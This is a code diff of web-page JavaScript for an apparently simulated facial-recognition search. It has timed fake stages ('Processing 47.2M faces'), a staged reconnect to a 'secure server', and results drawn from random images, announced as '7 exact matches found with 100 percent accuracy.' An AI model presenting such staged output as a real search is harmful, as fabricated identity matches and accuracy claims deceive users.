@@ -535,38 +549,35 @@
   function showInternetError(stream) {
     document.getElementById('loadingScreen').style.display = 'none';
     document.getElementById('errorBox').style.display = 'flex';
-    document.getElementById('meshOverlay').style.opacity = '0.2';
     document.getElementById('scanLine').classList.remove('active');
     
     speak("Connection lost. Server timeout.");
-    addChat("Connection to global database lost. Please retry.", 'sys');
+    addChat("Connection to global database lost. Please retry.", "sys");
     stream.getTracks().forEach(t => t.stop());
   }
 
   function retryScan() {
     document.getElementById('errorBox').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'flex';
-    document.getElementById('radarBg').classList.add('active');
     
     speak("Reconnecting to secure server. Resuming scan.");
-    addChat("Reconnecting...", 'sys');
+    addChat("Reconnecting...", "sys");
     
     const loadText = document.getElementById('loadText');
     const loadSubtext = document.getElementById('loadSubtext');
 
-    loadText.textContent = "RECONNECTING...";
+    loadText.textContent = "Reconnecting...";
     loadSubtext.textContent = "Establishing secure tunnel...";
 
     setTimeout(async () => {
       let stream = await initCamera();
-      document.getElementById('meshOverlay').style.opacity = '1';
       document.getElementById('scanLine').classList.add('active');
       
       const stages2 = [
-        { time: 0, text: "RESUMING MATCHING...", sub: "Processing 47.2M faces" },
-        { time: 3000, text: "ENHANCING DATA...", sub: "Comparing facial geometry" },
-        { time: 6000, text: "FILTERING RESULTS...", sub: "Removing false positives" },
-        { time: 9000, text: "COMPILING REPORT...", sub: "Generating final candidate list" }
+        { time: 0, text: "Resuming Matching...", sub: "Processing 47.2M faces" },
+        { time: 3000, text: "Enhancing Data...", sub: "Comparing facial geometry" },
+        { time: 6000, text: "Filtering Results...", sub: "Removing false positives" },
+        { time: 9000, text: "Compiling Report...", sub: "Generating final candidate list" }
       ];
 
       stages2.forEach(stage => {
@@ -574,7 +585,7 @@
           loadText.textContent = stage.text;
           loadSubtext.textContent = stage.sub;
           speak(stage.text);
-          addChat(stage.text, 'sys');
+          addChat(stage.text);
         }, stage.time);
       });
 
@@ -584,18 +595,15 @@
 
   function showResults(stream) {
     document.getElementById('scanLine').classList.remove('active');
-    document.getElementById('meshOverlay').classList.remove('active');
     document.getElementById('loadingScreen').style.display = 'none';
-    document.getElementById('radarBg').classList.remove('active');
     
     if(stream) stream.getTracks().forEach(t => t.stop());
 
     speak("Analysis complete. 7 exact matches found with 100 percent accuracy.");
-    addChat("Scan complete. 7 exact matches found.", 'sys');
+    addChat("Scan complete. 7 exact matches found.", "sys");
 
     document.getElementById('resultsContainer').style.display = 'block';
-    document.getElementById('targetProfile').classList.add('active'); // Show target card
-    document.getElementById('accLabel').textContent = "ACCURACY: 100.00%";
+    document.getElementById('targetProfile').classList.add('active');
     
     const grid = document.getElementById('resultsGrid');
     grid.innerHTML = '';
@@ -608,7 +616,7 @@
         card.className = 'result-card';
         
         card.innerHTML = `
-          <div class="match-badge loading" id="badge-${index}">ANALYZING...</div>
+          <div class="match-badge loading" id="badge-${index}">Analyzing...</div>
           <img src="${randomImg}" class="blurred" id="img-${index}" alt="${person.name}">
           <div class="info">
             <div class="name" style="opacity:0.3;" id="name-${index}">${person.name}</div>
